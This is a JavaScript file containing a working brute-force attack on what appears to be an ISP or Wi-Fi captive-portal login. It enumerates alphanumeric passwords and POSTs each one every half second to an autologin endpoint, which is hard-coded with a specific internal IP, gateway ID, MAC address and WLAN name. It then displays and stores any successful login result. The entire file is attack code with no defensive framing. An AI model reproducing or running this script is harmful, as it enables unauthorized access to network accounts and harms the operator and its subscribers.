function showResult(status, color, result, { message = '', url = '' }) {
  const body = document.body;
  const spanStatus = document.createElement("span");
  spanStatus.style.color = color;
  spanStatus.textContent = `[${status.toUpperCase()}] `;
  const spanMessage = document.createElement("span");
  spanMessage.style.color = color;
  spanMessage.textContent = `ResultCode: ${result}, Message: ${message}, URL: ${url}`;
  const div = document.createElement("div");
  div.style.padding = "0.5rem 1rem";
  div.appendChild(spanStatus);
  div.appendChild(spanMessage);
  body.appendChild(div);
  return div;
}

function attack(myPass) {
  return new Promise(async (resolve, reject) => {

    var makeId = makeid();
    var username= $("#username").val(myPass);
    var user = $("#username_hidden").val(username+'.'+makeId+'@wmslite.1704860352');
    var password = $("#password").val(username);
    $('#landURL').val('');

    const api = 'auth/authnew/autologin/quarantine.php?ipc=10.222.84.51&gw_id=WAG-D6-BPP&mac=34:02:86:4f:04:ac&redirect=&wlan=GPON09-D6-SMR-4 pon 14/10/13/1:191:KostPhotoAngga2&landURL=';
    const serialize = $('#loginForm').serialize();
    
    $.ajax({
      type: 'POST',
      url: api,
      dataType:'json',
      data: serialize,
      timeout: 15000,
      error: function(err){ reject(err) },
      statusCode: {
          500: function() {},
          404: function() {}
      },
      success: function(data) 
      {
        resolve(data);
      }
    });
  });
}

function bruteForce() {
  const possibleChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let updatedPass = "";
  let currentCombination = [0,0,-1];
  setInterval(() => {
    if (currentCombination[currentCombination.length - 1] != possibleChar.length - 1) {
      currentCombination[currentCombination.length - 1]++;
    } else {
      currentCombination[currentCombination.length - 1] = 0;
      let currentPointer = 1;
      while (true) {
        if (currentCombination.length - 1 - currentPointer < 0) {
          currentCombination.unshift(-1);
        }
        if (currentCombination[currentCombination.length - 1 - currentPointer] < possibleChar.length - 1) {
          currentCombination[currentCombination.length - 1 - currentPointer]++;
          break;
        } else {
          currentCombination[currentCombination.length - 1 - currentPointer] = 0;
          currentPointer++;
        }
      }
    }
    const generatedPass = currentCombination.reduce((acc, current) => acc + possibleChar[current], "");
    attack(generatedPass).then(data => {
      if (data.result == 0) {
        showResult("FAILED", "red", data.result, { message: data.message });
      } else {
        const div = showResult("SUCCES", "green", data.result, { url: data.redirect });
        console.log(data);
        window.succesData = data;
        document.body.insertBefore(div, document.body.firstChild);
      }
    }).catch(err => {
        showResult("FAILED", "red", -1, { message: err });
    });
    updatedPass = generatedPass;
  }, 500);
}
